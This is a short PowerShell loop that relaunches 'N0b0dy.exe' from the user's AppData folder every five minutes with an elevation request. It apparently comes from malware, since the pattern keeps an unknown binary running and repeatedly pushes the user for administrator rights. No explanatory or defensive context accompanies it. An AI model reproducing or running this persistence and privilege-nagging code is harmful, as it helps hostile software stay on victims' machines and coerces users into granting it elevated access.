while ($true) {
        Start-Sleep -Seconds 300
        Start-Process "C:\Users\$Env:USERNAME\AppData\N0b0dy.exe" -Verb runAs
}
